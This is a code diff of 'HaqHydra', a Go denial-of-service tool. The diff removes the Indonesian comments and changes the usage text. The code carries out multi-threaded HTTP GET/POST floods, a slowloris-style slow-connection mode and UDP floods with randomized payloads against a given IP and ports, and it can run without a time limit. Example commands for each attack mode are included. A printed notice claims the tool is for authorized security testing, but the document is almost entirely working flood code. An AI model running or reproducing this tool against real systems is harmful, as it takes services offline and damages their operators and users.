@@ -2,7 +2,7 @@ package main
 
 import (
 	"bufio"
-	"crypto/rand" // Untuk angka acak kriptografis
+	"crypto/rand"
 	"fmt"
 	"io"
 	"log"
@@ -10,7 +10,7 @@ import (
 	"net"
 	"os"
 	"os/signal"
-	"strconv" // Untuk konversi angka
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -18,22 +18,20 @@ import (
 	"time"
 )
 
-// --- Konfigurasi Global & Statistik ---
 var (
 	sentRequestsTotal atomic.Uint64
 	activeConnections atomic.Uint64
 	errorCount atomic.Uint64
 	serverErrors atomic.Uint64
 
-	stopEvent chan struct{} // Sinyal untuk menghentikan goroutine
+	stopEvent chan struct{}
 	logFile   *os.File
 	logger    *log.Logger
-	wg        sync.WaitGroup // Untuk menunggu semua goroutine selesai
+	wg        sync.WaitGroup
 
-	LOG_FILENAME string // <<<<<<<<< DEKLARASI GLOBAL UNTUK NAMA FILE LOG
+	LOG_FILENAME string
 )
 
-// --- Banner ---
 const BANNER = `
 ░█▀▀▀█░░█░░░█░█▀▀█░█▀▀▄░█▀▀▄░░░░█░░░█░█▀▀█░█▀▀▄░█▀▀█░
 ░█░░░█░░█░░░█░█░░█░█░░░░█░░░░░░░░█░░░█░█░░█░█░░░░█░░░░
@@ -50,7 +48,6 @@ const BANNER = `
 ╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░╚══════╝░
 `
 
-// --- User Agents ---
 var USER_AGENTS = []string{
 	"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
 	"Mozilla/5.0 (Linux; Android 10; SM-N975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
@@ -74,12 +71,10 @@ var USER_AGENTS = []string{
 
 const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
 
-// --- Helper Functions ---
 func getRandomBigInt(max int64) *big.Int {
 	n, err := rand.Int(rand.Reader, big.NewInt(max))
 	if err != nil {
 		log.Printf("Warning: crypto/rand failed, falling back to math/rand for random number: %v", err)
-		// Fallback yang sangat sederhana jika crypto/rand gagal
 		return big.NewInt(int64(time.Now().Nanosecond() % int(max)))
 	}
 	return n
@@ -120,23 +115,22 @@ func parseHTTPStatus(responseData []byte) (string, string) {
 	return "", "Non-HTTP Response"
 }
 
-// --- Attack Manager ---
 type AttackManager struct {
 	targetIP        string
 	ports           []int
 	threadsPerPort  int
 	attackType      string
 	mode            string
-	durationSec     *int64 // Pointer to distinguish 0 from nil
+	durationSec     *int64
 	httpMethod      string
 	numSocketsPerThread int
-	stopCh          chan struct{} // For goroutine stop signals
-	wg              sync.WaitGroup // To wait for goroutines
+	stopCh          chan struct{}
+	wg              sync.WaitGroup
 }
 
 func NewAttackManager(targetIP string, ports []int, threadsPerPort int, attackType, mode string, durationSec int64, httpMethod string) *AttackManager {
 	if durationSec < 0 {
-		durationSec = 0 // Negative duration means unlimited
+		durationSec = 0
 	}
 	var durationPtr *int64
 	if durationSec > 0 {
@@ -185,7 +179,6 @@ func (am *AttackManager) atomicGet(val *atomic.Uint64) uint64 {
 	return val.Load()
 }
 
-// --- Helper Methods ---
 func (am *AttackManager) generateHTTPRequest(target, method, mode string) string {
 	randomPath := fmt.Sprintf("/?%s", generateRandomString(10))
 	headers := []string{
@@ -223,7 +216,7 @@ func (am *AttackManager) generateHTTPRequest(target, method, mode string) string
 		}
 	}
 
-	headers = append(headers, "") // Akhiri header dengan baris kosong
+	headers = append(headers, "")
 	request := strings.Join(headers, "\r\n")
 	if len(bodyData) > 0 {
 		request += "\r\n" + string(bodyData)
@@ -232,7 +225,7 @@ func (am *AttackManager) generateHTTPRequest(target, method, mode string) string
 }
 
 func (am *AttackManager) generateUDPPacket() []byte {
-	payloadLen := 500 + int(getRandomBigInt(500).Int64()) // Panjang acak antara 500-1000
+	payloadLen := 500 + int(getRandomBigInt(500).Int64())
 	payload := make([]byte, payloadLen)
 	for i := range payload {
 		randomIndex := getRandomBigInt(int64(len(charset)))
@@ -240,8 +233,6 @@ func (am *AttackManager) generateUDPPacket() []byte {
 	}
 	return payload
 }
-
-// --- Goroutine Methods ---
 
 func (am *AttackManager) openConnection(port int, limit int) {
 	var conn net.Conn
@@ -264,18 +255,17 @@ func (am *AttackManager) openConnection(port int, limit int) {
 		return
 	}
 
-	// Konfigurasi koneksi dasar
 	if tcpConn, ok := conn.(*net.TCPConn); ok {
 		tcpConn.SetKeepAlive(true)
 		tcpConn.SetKeepAlivePeriod(30 * time.Second)
 	}
 
-	am.wg.Add(1) // Tambah ke waitgroup sebelum goroutine aktif
+	am.wg.Add(1)
 	go func() {
-		defer wg.Done() // Pastikan wg.Done() dipanggil
+		defer wg.Done()
 		defer conn.Close()
 
-		if am.atomicGet(&activeConnections) >= uint64(limit) && am.attackType == "http" { // Hanya batasi koneksi untuk HTTP
+		if am.atomicGet(&activeConnections) >= uint64(limit) && am.attackType == "http" {
 			return
 		}
 
@@ -302,77 +292,68 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 
 	for {
 		select {
-		case <-stopEvent: // Sinyal berhenti global
+		case <-stopEvent:
 			am.log("Received stop signal. Exiting HTTP goroutine for %d.", port)
 			return
 		default:
-			// Lanjutkan jika tidak ada sinyal berhenti
 		}
 
-		// Cek durasi serangan
 		if am.durationSec != nil && time.Since(startTime).Seconds() > float64(*am.durationSec) {
 			am.log("Attack duration reached for %d. Stopping HTTP goroutine.", port)
 			return
 		}
 
-		// Coba buka koneksi baru jika masih di bawah batas (hanya untuk http)
-		// Ini harusnya ditangani oleh pemanggil `openConnection` utama, tapi bisa juga cek di sini
 		if am.atomicGet(&activeConnections) < uint64(am.numSocketsPerThread) {
-			go am.openConnection(port, am.numSocketsPerThread) // Buka koneksi baru
+			go am.openConnection(port, am.numSocketsPerThread)
 		}
 
-		// Cek apakah koneksi masih aktif atau perlu ditutup
 		if err := conn.SetReadDeadline(time.Now().Add(2 * time.Second)); err != nil {
 			am.atomicInc(&errorCount)
 			am.log("Failed to set read deadline for %d: %v", port, err)
 			return
 		}
 		
-		buffer := make([]byte, 1) // Baca 1 byte untuk cek keaktifan koneksi
+		buffer := make([]byte, 1)
 		n, readErr := conn.Read(buffer)
 
 		if readErr != nil {
 			if netErr, ok := readErr.(net.Error); ok && netErr.Timeout() {
-				// Timeout, coba kirim data lagi (penting untuk mode slow)
-				if am.mode == "slow" && time.Since(lastWriteTime).Seconds() < 5 { // Kirim ulang jika belum terlalu lama
-					goto sendData // Lompat ke bagian kirim data
+				if am.mode == "slow" && time.Since(lastWriteTime).Seconds() < 5 {
+					goto sendData
 				}
 				
 				idleLoops++
-				if idleLoops > 5 { // Jika timeout berulang kali, anggap koneksi mati
+				if idleLoops > 5 {
 					am.log("Read timeout repeated for %d. Closing connection.", port)
 					return
 				}
-				continue // Lanjutkan ke loop berikutnya
+				continue
 			} else {
 				am.atomicInc(&errorCount)
 				am.log("Read error from %d: %v", port, readErr)
-				return // Tutup koneksi jika ada error lain
+				return
 			}
 		}
 
-		idleLoops = 0 // Reset idle counter jika ada pembacaan berhasil
+		idleLoops = 0
 
 		if n > 0 {
-			// Parse status jika ada respons
 			status, _ := parseHTTPStatus(buffer[:n])
 			if status != "" && (strings.HasPrefix(status, "4") || strings.HasPrefix(status, "5")) {
 				am.atomicInc(&serverErrors)
 				am.log("Server Error (%s) from %d", status, port)
 			}
 
-			if am.mode == "normal" { // Mode normal: tutup setelah baca
+			if am.mode == "normal" {
 				am.log("Received response for %d. Closing connection (normal mode).", port)
 				return
 			}
-			// Jika mode 'slow', biarkan koneksi terbuka
-		} else { // n == 0, berarti koneksi ditutup oleh peer
+		} else {
 			am.log("Connection closed by peer on %d.", port)
 			return
 		}
 
-	sendData: // Label untuk melompat ke sini (misalnya saat timeout pada mode slow)
-		// Kirim permintaan
+	sendData:
 		request, ok := <-requestQueue
 		if !ok {
 			am.log("Request queue empty for %d. Exiting.", port)
@@ -385,9 +366,9 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 			return
 		}
 		am.atomicInc(&sentRequestsTotal)
-		lastWriteTime = time.Now() // Catat waktu terakhir kirim data
+		lastWriteTime = time.Now()
 
-		if am.mode == "slow" { // Kirim data tambahan untuk mode slow
+		if am.mode == "slow" {
 			slowData := fmt.Sprintf("X-HaqHydra-KeepAlive: %s\r\n", generateRandomString(15))
 			if _, writeSlowErr := conn.Write([]byte(slowData)); writeSlowErr != nil {
 				am.atomicInc(&errorCount)
@@ -396,7 +377,7 @@ func (am *AttackManager) httpAttackGoroutine(conn net.Conn, port int) {
 			}
 		}
 		
-		time.Sleep(time.Millisecond * 1) // Jeda kecil
+		time.Sleep(time.Millisecond * 1)
 	}
 }
 
@@ -408,10 +389,8 @@ func (am *AttackManager) udpAttackGoroutine(conn net.Conn, port int) {
 			am.log("Received stop signal. Exiting UDP goroutine for %d.", port)
 			return
 		default:
-			// Lanjutkan jika tidak ada sinyal berhenti
 		}
 
-		// Cek durasi serangan
 		if am.durationSec != nil && time.Since(startTime).Seconds() > float64(*am.durationSec) {
 			am.log("Attack duration reached for %d. Stopping UDP goroutine.", port)
 			return
@@ -425,7 +404,7 @@ func (am *AttackManager) udpAttackGoroutine(conn net.Conn, port int) {
 		}
 		am.atomicInc(&sentRequestsTotal)
 
-		time.Sleep(time.Millisecond * time.Duration(1+int(getRandomBigInt(4).Int64()))) // Jeda acak kecil
+		time.Sleep(time.Millisecond * time.Duration(1+int(getRandomBigInt(4).Int64())))
 	}
 }
 
@@ -433,7 +412,7 @@ func (am *AttackManager) statsDisplay() {
 	for {
 		select {
 		case <-stopEvent:
-			fmt.Print("\n") // Pindah ke baris baru
+			fmt.Print("\n")
 			return
 		case <-time.After(1 * time.Second):
 			fmt.Printf("\r[\033[1;36mSTATS\033[0m] Target: \033[1;36m%s\033[0m | Sent: \033[1;32m%d\033[0m | Active Con: \033[1;34m%d\033[0m | Srv Err: \033[1;33m%d\033[0m | Errors: \033[1;31m%d\033[0m | Log: %s",
@@ -442,7 +421,7 @@ func (am *AttackManager) statsDisplay() {
 				am.atomicGet(&activeConnections),
 				am.atomicGet(&serverErrors),
 				am.atomicGet(&errorCount),
-				LOG_FILENAME, // Sekarang LOG_FILENAME sudah terdefinisi
+				LOG_FILENAME,
 			)
 		}
 	}
@@ -457,53 +436,43 @@ func (am *AttackManager) Start() {
 			return fmt.Sprintf("%ds", *am.durationSec)
 		}())
 
-	// Mulai goroutine statistik
 	go am.statsDisplay()
 
-	// Mulai goroutine serangan
 	for _, port := range am.ports {
 		for i := 0; i < am.threadsPerPort; i++ {
-			// Pemanggilan openConnection sekarang menangani pembuatan koneksi dan goroutine
 			go am.openConnection(port, am.numSocketsPerThread)
 		}
 	}
 
-	// Loop utama untuk durasi atau menunggu interupsi
 	if am.durationSec != nil {
 		time.Sleep(time.Duration(*am.durationSec) * time.Second)
 		fmt.Printf("\n\033[1;33mAttack duration (%ds) reached. Stopping attack...\033[0m\n", *am.durationSec)
-		close(stopEvent) // Kirim sinyal berhenti global
+		close(stopEvent)
 	} else {
 		fmt.Println("\033[1;31mAttack running indefinitely. Press Ctrl+C to stop...\033[0m")
-		<-stopEvent // Tunggu sinyal berhenti global (dari Ctrl+C)
+		<-stopEvent
 	}
 
-	// Tunggu semua goroutine serangan selesai setelah sinyal berhenti dikirim
 	am.wg.Wait()
 	fmt.Println("\nHaqHydra attack finished.")
 }
 
-// --- Main Function ---
 func main() {
-	// Inisialisasi Awal
 	fmt.Printf("\033[1;36m------------------------------------------------------------\033[0m\n")
 	fmt.Printf("\033[1;36m%s\033[0m\n", "Inisialisasi...")
 	fmt.Printf("\033[1;36m------------------------------------------------------------\033[0m\n")
 
-	// Setup Logging
-	LOG_FILENAME = "attack_log.txt" // <<<<<<< SEKARANG LOG_FILENAME DIINISIALISASI GLOBAL
+	LOG_FILENAME = "attack_log.txt"
 	var err error
 	logFile, err = os.OpenFile(LOG_FILENAME, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
 	if err != nil {
 		log.Fatalf("Failed to open log file: %v", err)
 	}
-	// Gunakan io.MultiWriter untuk menulis ke konsol dan file log
 	logger = log.New(io.MultiWriter(os.Stdout, logFile), "", log.Ldate|log.Ltime)
 
-	fmt.Print(BANNER) // Cetak banner hanya di sini
+	fmt.Print(BANNER)
 	fmt.Printf("\n\033[1;36m------------------------------------------------------------\033[0m\n")
 
-	// Peringatan & Instruksi
 	fmt.Println("\033[1;33m!!! PERINGATAN HAQ-HYDRA !!!\033[0m")
 	fmt.Println("\033[1;33mScript ini adalah alat PENGUJIAN KEAMANAN yang kuat.\033[0m")
 	fmt.Println("\033[1;33mGunakan HANYA pada sistem yang Anda miliki atau memiliki izin TERTULIS.\033[0m")
@@ -512,18 +481,17 @@ func main() {
 
 	time.Sleep(5 * time.Second)
 
-	// Parsing Argumen Command Line
 	if len(os.Args) < 7 {
-		fmt.Printf("\nUsage: %s <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]\n", os.Args[0])
+		fmt.Printf("\nUsage: HaqHydra <TARGET_IP> <PORT> <THREADS_PER_PORT> <ATTACK_TYPE> <MODE> <DURATION_SEC> [HTTP_METHOD]\n")
 		fmt.Println("DURATION_SEC: Attack duration in seconds (e.g., 60 for 1 minute, 0 for unlimited)")
 		fmt.Println("ATTACK_TYPE: 'http' or 'udp'")
 		fmt.Println("MODE: 'normal' (fast flood) or 'slow' (slowloris-like)")
 		fmt.Println("HTTP_METHOD (optional for 'http' type): 'GET' (default) or 'POST'")
 		fmt.Println("\nExample:")
-		fmt.Printf("  HTTP Normal GET (60s):  %s 192.168.1.100 80 500 http normal 60 GET\n", os.Args[0])
-		fmt.Printf("  HTTP Slow POST (120s):  %s 192.168.1.100 8080 200 http slow 120 POST\n", os.Args[0])
-		fmt.Printf("  UDP Flood (30s):        %s 192.168.1.100 53 1000 udp 30\n", os.Args[0])
-		fmt.Printf("  Unlimited UDP:          %s 192.168.1.100 53 1000 udp 0\n", os.Args[0])
+		fmt.Printf("  HTTP Normal GET (60s):  HaqHydra 192.168.1.100 80 500 http normal 60 GET\n")
+		fmt.Printf("  HTTP Slow POST (120s):  HaqHydra 192.168.1.100 8080 200 http slow 120 POST\n")
+		fmt.Printf("  UDP Flood (30s):        HaqHydra 192.168.1.100 53 1000 udp 30\n")
+		fmt.Printf("  Unlimited UDP:          HaqHydra 192.168.1.100 53 1000 udp 0\n")
 		os.Exit(1)
 	}
 
@@ -547,12 +515,10 @@ func main() {
 		}
 	}
 
-	// Validasi Attack Type
 	if !strings.Contains("http udp", strings.ToLower(attackType)) {
 		log.Fatalf("Invalid ATTACK_TYPE '%s'. Must be 'http' or 'udp'.", attackType)
 	}
 
-	// Parsing Port
 	var ports []int
 	if strings.Contains(portArg, "-") {
 		parts := strings.Split(portArg, "-")
@@ -572,19 +538,16 @@ func main() {
 		ports = append(ports, port)
 	}
 
-	// Setup stop channel
 	stopEvent = make(chan struct{})
 
-	// Buat dan jalankan AttackManager
 	manager := NewAttackManager(targetIP, ports, threadsPerPort, attackType, mode, durationSec, httpMethod)
 
-	// Handle Ctrl+C (SIGINT)
 	go func() {
 		sig := make(chan os.Signal, 1)
 		signal.Notify(sig, syscall.SIGINT, syscall.SIGTERM)
 		<-sig
 		fmt.Println("\nCtrl+C detected. Initiating shutdown...")
-		close(stopEvent) // Kirim sinyal berhenti global
+		close(stopEvent)
 	}()
 
 	manager.Start()
